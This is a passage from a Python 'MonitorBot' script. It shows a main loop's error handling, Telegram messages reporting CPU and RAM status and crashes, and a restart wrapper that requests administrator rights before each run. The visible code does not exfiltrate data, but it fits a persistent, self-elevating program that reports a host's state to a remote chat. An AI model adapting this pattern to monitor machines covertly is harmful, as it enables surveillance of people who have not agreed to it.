                    system_info = LocationService.get_system_info()
                    status_msg = f"💚 System OK | CPU: {system_info.get('cpu_usage', 'N/A')}% | RAM: {system_info.get('ram_usage', 'N/A')}%"
                    bot.send_message(status_msg)
                
    except Exception as e:
        logger.log_error(f"🚨 Critical error in main: {e}")
        
        # Try to send error notification
        try:
            bot = TelegramBot()
            bot.send_message(f"🚨 MonitorBot Crashed: {str(e)[:100]}...")
        except:
            pass
        
        # Wait and restart
        time.sleep(30)
        logger.log_info("🔄 Attempting restart...")
        # Don't call main() recursively - will be handled by wrapper

# ==================== APPLICATION WRAPPER ====================
def run_with_restart():
    """Wrapper to handle application restarts"""
    restart_count = 0
    max_restarts = 10
    
    while restart_count < max_restarts:
        try:
            SystemUtils.run_as_admin()
            main()
        except Exception as e:
            restart_count += 1
            logger.log_error(f"Application crash #{restart_count}: {e}")
            
            if restart_count >= max_restarts:
                logger.log_error("🚨 Maximum restart attempts reached. Exiting.")
                break
                
            time.sleep(30)
            logger.log_info(f"🔄 Restarting application... ({restart_count}/{max_restarts})")

if __name__ == "__main__":
    # ✅ FIXED: Use wrapper instead of recursive call
    run_with_restart()
